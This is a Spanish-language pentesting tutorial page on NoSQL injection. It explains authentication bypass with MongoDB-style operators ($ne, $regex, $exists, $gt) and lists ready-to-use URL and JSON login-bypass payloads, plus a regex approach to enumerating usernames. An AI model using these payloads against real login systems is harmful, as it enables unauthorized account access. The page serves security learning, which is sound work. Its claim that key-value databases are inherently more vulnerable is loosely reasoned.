# NoSQL Injection (NoSQLi)

## ¿Que es una Inyección NoSQL?

Una inyección NoSQL, es como concepto algo bastante parecido a las inyecciones SQL, solo que estas no usan tablas para almacenar datos, si no que usan un modelo clave-valor, este concepto, las hace más vulnerables que las bases de datos SQL ya que no usan el modelo relacional además de que estas no tienen tablas a diferencia de las SQL, y este es un factor que hace que los atacantes puedan utilizar el código malicioso para insertar datos que bypassen o no sean validos en la base de datos NoSQL

## Bypass de Autenticación

La gran mayoría y las más utilizadas bases de datos NoSQL utilizan el formato JSON para enviar los datos a la BBDD:

```json
{"username":"myaccount","password":"password"}
```

En sitios vulnerables, la autenticación se desarrolla de forma muy básica, de manera que si los valores que le enviamos a través de las cabeceras son correctos (Devuelven estado True), da acceso al usuario con las credenciales que hemos proporcionado, pero aprovechando la poca prevención y la implementación básica, podemos reemplazar por ejemplo el valor de la contraseña con algo que nos devuelva TRUE.&#x20;

En la siguiente solicitud  le decimos que el usuario es admin (Esto lo sabemos) y que la contraseña no es admin, si esto se cumple, nos dará acceso:

```json
{"username":"admin", "password": {"$ne": null}}
```

Otra forma si no sabemos por completo uno de los valores, o queremos enumerar usuarios, podemos usar las Expresiones Regulares con REGEX:

```json
{"username": {"$regex":"^a"},"password":"password"}
```

De esta manera, la solicitud, valida que para el campo usuario, el valor empiece por "a", esta es una manera de enumerar usuarios, e intercambiando el uso de expresiones regulares en un campo o en otro, ponemos hacer un script para fuerza bruta.

Existen variedad de Payloads de este tipo, aquí algunos:

```sh
#in URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```

<figure><img src="../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Enlaces de Interés:

1. [https://book.hacktricks.xyz/v/es/pentesting-web/nosql-injection](https://book.hacktricks.xyz/v/es/pentesting-web/nosql-injection)
2. [https://secops.group/a-pentesters-guide-to-nosql-injection/](https://secops.group/a-pentesters-guide-to-nosql-injection/)
3. [https://gitlab.com/pentest-tools/PayloadsAllTheThings/-/tree/master/NoSQL%20Injection](https://gitlab.com/pentest-tools/PayloadsAllTheThings/-/tree/master/NoSQL%20Injection)
{% endhint %}
